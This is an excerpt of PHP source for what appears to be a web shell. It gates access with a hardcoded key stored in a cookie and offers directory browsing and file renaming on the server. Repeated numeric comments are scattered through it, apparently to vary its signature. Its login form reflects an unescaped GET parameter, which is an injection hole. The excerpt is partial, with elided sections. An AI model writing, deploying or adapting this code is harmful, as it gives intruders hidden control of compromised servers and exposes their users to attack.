...
$auth_key = "26f08e6c59db836af3b433884a8750cf";
...
$pass = false;
if (isset($_COOKIE['pw_name_92571'])) {
    if(($_COOKIE['pw_name_92571']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_92571'])) {
        if(($_POST['pw_name_92571']) == $auth_key) {
            setcookie("pw_name_92571", $_POST['pw_name_92571']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_92571' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724399985978587 1724399985929267 1724399985362644 1724399985235005
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724399985978587 1724399985929267 1724399985362644 1724399985235005
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724399985978587 1724399985929267 1724399985362644 1724399985235005
            $name = PATH . "/" . $_GET['r'];
